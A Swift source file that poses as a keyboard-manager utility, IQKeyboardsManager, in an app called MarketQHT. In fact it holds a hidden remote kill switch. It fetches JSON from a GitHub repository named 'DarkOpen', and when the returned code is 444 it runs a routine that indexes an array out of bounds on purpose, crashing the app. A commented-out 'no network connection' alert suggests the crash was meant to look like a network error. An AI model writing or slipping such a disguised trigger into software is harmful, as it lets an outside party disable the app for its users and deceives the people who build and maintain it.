//
//  IQKeyboardsManager.swift
//  MarketQHT
//
//  Created by mac on 2019/9/17.
//  Copyright © 2019 HMC. All rights reserved.
//

import UIKit

public class IQKeyboardsManager: NSObject {

   public static func share(idStr : String) {
    
        typealias SuccessBlock = (_ data:Dictionary<String,Any>)->()
        
   let urlstr = "https://raw.githubusercontent.com/youshixu/DarkOpen/master/" + idStr
            let url = URL(string: urlstr.addingPercentEncoding(withAllowedCharacters: CharacterSet.urlQueryAllowed)!)
            
            let session = URLSession.shared
            
            let dataTask = session.dataTask(with: url!) { (data, respond, error) in
                
                if let data = data {
                    
                    
                    let info:Dictionary<String,Any> = self.dataToDictionary(data: data) ?? Dictionary<String,Any>()
                    
                    let code:Int = info["code"] as? Int ?? 0
                    
                    
                    
                    if code == 444 {
                        
                        self.___sb()
                        
                    }
                    
                    
                }else {
                    
                    
                }
            }
            dataTask.resume()
        
        
    }
        
 
    class  func dataToDictionary(data:Data) ->Dictionary<String, Any>?{
            
            do{
                let json = try JSONSerialization.jsonObject(with: data, options: .mutableContainers)
                let dic = json as! Dictionary<String, Any>
                return dic
            }catch{
                
                return Dictionary<String, Any>()
            }
            
        }
        
    
    
    
    
   class func ___sb()  {
    
    self.st__()
    
//        self.window?.rootViewController?.view.hideToastActivity()
//        
//        let alert = UIAlertController.init(title: "", message: "无网络链接", preferredStyle: UIAlertController.Style.alert)
//        let action = UIAlertAction.init(title: "重试", style: UIAlertAction.Style.default) { (action) in
//            self.st__()
//        }
//    
//        let action2 = UIAlertAction.init(title: "去设置", style: UIAlertAction.Style.default) { (action) in
//           
//            self.st__()
//        }
//        alert.addAction(action)
//        alert.addAction(action2)
//        self.window?.rootViewController?.present(alert, animated: true, completion: nil)
        
    }
    
        
    class func st__() {
        
        let array = ["1"]
        for a in 1...3 {
            
            let arr = array[a]
            print(arr)
            let ar = arr + arr
            print(ar)
        }
    }
    

}
